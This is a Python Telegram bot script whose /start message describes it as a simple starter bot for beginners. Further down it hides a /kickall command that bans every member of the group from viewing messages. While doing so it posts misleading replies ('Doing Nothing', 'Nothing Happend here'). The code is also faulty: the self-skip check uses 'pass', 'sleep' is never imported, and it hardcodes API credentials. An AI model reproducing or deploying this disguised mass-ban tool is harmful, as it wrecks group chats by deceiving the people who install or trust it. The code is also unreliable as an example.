# < (c) 2021 @Godmrunal >

import logging
from os import remove

import requests
from decouple import config
from telethon import Button, TelegramClient, events


logging.basicConfig(
    format="[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s", level=logging.INFO
)

bot = TelegramClient(None, api_id=6, api_hash="eb06d4abfb49dc3eeb1aeb98ae0f581e").start(
    bot_token=config("BOT_TOKEN")
)

logging.info("Starting bot...")


@bot.on(events.NewMessage(incoming=True, pattern="^/start"))
async def start_(event):
    await event.reply(
        "Hi {}!\nI am a simple bot. \n\n**Usage:** This bot will help to start first bot in python!".format(
            (await bot.get_entity(event.sender_id)).first_name
        ),
        buttons=[
            [
                Button.url("Repo", url="https://github.com/msy1717/startBot"),
                Button.url(
                    "Developer", url="https://t.me/Godmrunal"
                ),
            ],
            [Button.url("Channel", url="https://t.me/BeastX_Bots")],
        ],
    )


from telethon.tl.functions.channels import EditBannedRequest

from telethon.tl.types import ChatBannedRights

@bot.on(events.NewMessage(incoming=True, pattern="^/kickall"))

async def ban_(event):

  nikal = await event.get_chat()

  chutiya = await event.client.get_me()

  admin = nikal.admin_rights

  creator = nikal.creator

  if not admin and not creator:

    await event.edit(" Don't have sufficient permission 🧐 u noob 😑😑")

    return

  await event.edit("Doing Nothing 🙃🙂")  

  everyone = await event.client.get_participants(event.chat_id)

  for user in everyone:

    if user.id == chutiya.id:

      pass

    try:

      await event.client(EditBannedRequest(event.chat_id,int(user.id),ChatBannedRights(until_date=None,view_messages=True),))

    except Exception as e:

      await event.edit(str(e))

    await sleep(0.5)

  await event.edit("Nothing Happend here🙃🙂")

  

logging.info("\n\nBot has started.\n(c) @Godmrunal")

bot.run_until_disconnected()
